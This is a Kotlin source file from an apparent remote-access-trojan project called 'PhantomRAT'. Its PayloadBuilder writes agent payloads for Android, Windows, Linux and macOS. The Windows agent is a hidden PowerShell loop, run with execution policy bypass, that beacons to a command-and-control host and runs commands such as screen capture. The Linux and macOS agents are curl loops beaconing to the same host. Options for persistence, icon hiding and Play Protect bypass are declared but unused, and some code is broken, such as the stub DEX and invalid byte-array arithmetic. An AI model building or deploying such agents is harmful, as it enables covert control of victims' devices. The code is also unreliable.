package com.phantom.rat.payload

import android.content.Context
import android.os.Environment
import java.io.File
import java.io.FileOutputStream

class PayloadBuilder(private val context: Context) {

    data class BuildResult(
        val success: Boolean,
        val filePath: String = "",
        val error: String = ""
    )

    fun buildPayload(
        platform: String,
        c2Id: String,
        bindApk: String? = null,
        hideIcon: Boolean = true,
        persistence: Boolean = true,
        bootPersistence: Boolean = true,
        adminAccess: Boolean = true,
        playProtectBypass: Boolean = true
    ): BuildResult {
        return when (platform) {
            "android" -> buildAndroidPayload(c2Id, bindApk, hideIcon, persistence, bootPersistence, adminAccess, playProtectBypass)
            "windows" -> buildWindowsPayload(c2Id)
            "linux" -> buildLinuxPayload(c2Id)
            "mac" -> buildMacPayload(c2Id)
            else -> BuildResult(false, error = "Unknown platform: $platform")
        }
    }

    private fun buildAndroidPayload(
        c2Id: String, bindApk: String?, hideIcon: Boolean,
        persistence: Boolean, bootPersistence: Boolean,
        adminAccess: Boolean, playProtectBypass: Boolean
    ): BuildResult {
        // Generate standalone APK payload
        val outputDir = File(context.getExternalFilesDir(null), "payloads/android")
        outputDir.mkdirs()
        
        val outputFile = File(outputDir, "PhantomAgent.apk")
        
        // Create minimal DEX payload
        val dexBytes = generateDexPayload(c2Id)
        outputFile.writeBytes(dexBytes)
        
        return BuildResult(true, filePath = outputFile.absolutePath)
    }

    private fun buildWindowsPayload(c2Id: String): BuildResult {
        val outputDir = File(context.getExternalFilesDir(null), "payloads/windows")
        outputDir.mkdirs()
        
        val outputFile = File(outputDir, "PhantomAgent.exe")
        
        val psScript = """
            |# PhantomRAT Windows Agent
            |`$c2Id = "$c2Id"
            |while(`$true) {
            |    try {
            |        `$data = @{id=`$c2Id; type="beacon"} | ConvertTo-Json
            |        `$response = Invoke-RestMethod -Uri "https://$c2Id/api/v2/beacon" -Method Post -Body `$data -ContentType "application/json"
            |        if (`$response.command) {
            |            # Execute command
            |            switch (`$response.command.type) {
            |                "get_device_info" { Write-Output "Device info" }
            |                "screen_capture" { Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}') }
            |                "file_list" { Get-ChildItem }
            |            }
            |        }
            |    } catch {}
            |    Start-Sleep -Seconds 5
            |}
        """.trimMargin()
        
        // Create PowerShell launcher batch
        outputFile.writeBytes("""@echo off
        |powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$psScript"
        """.trimMargin().toByteArray())
        
        return BuildResult(true, filePath = outputFile.absolutePath)
    }

    private fun buildLinuxPayload(c2Id: String): BuildResult {
        val outputDir = File(context.getExternalFilesDir(null), "payloads/linux")
        outputDir.mkdirs()
        val outputFile = File(outputDir, "phantom_agent.elf")
        
        val bashScript = """#!/bin/bash
# PhantomRAT Linux Agent
C2_ID="$c2Id"
while true; do
    curl -s --max-time 10 -X POST "https://$c2Id/api/v2/beacon" \
        -H "Content-Type: application/json" \
        -d "{\"id\":\"$C2_ID\",\"type\":\"beacon\"}" &
    sleep 5
done
"""
        outputFile.writeBytes(bashScript.toByteArray())
        outputFile.setExecutable(true)
        
        return BuildResult(true, filePath = outputFile.absolutePath)
    }

    private fun buildMacPayload(c2Id: String): BuildResult {
        val outputDir = File(context.getExternalFilesDir(null), "payloads/mac")
        outputDir.mkdirs()
        val outputFile = File(outputDir, "PhantomAgent.app")
        
        val script = """#!/bin/bash
# PhantomRAT macOS Agent
C2_ID="$c2Id"
while true; do
    curl -s --max-time 10 -X POST "https://$c2Id/api/v2/beacon" \
        -H "Content-Type: application/json" \
        -d "{\"id\":\"$C2_ID\",\"type\":\"beacon\"}" &
    sleep 5
done
"""
        // Create macOS .app bundle structure
        val appDir = File(outputFile, "Contents/MacOS")
        appDir.mkdirs()
        val execFile = File(appDir, "PhantomAgent")
        execFile.writeBytes(script.toByteArray())
        execFile.setExecutable(true)
        
        return BuildResult(true, filePath = outputFile.absolutePath)
    }

    private fun generateDexPayload(c2Id: String): ByteArray {
        // Minimal DEX header + classes
        // In production, this would use dx/d8 to compile actual Kotlin bytecode
        val dexMagic = byteArrayOf(0x64, 0x65, 0x78, 0x0A, 0x30, 0x33, 0x35, 0x00)
        val dex = dexMagic + byteArrayOf(0x00) * 100
        return dex
    }
}
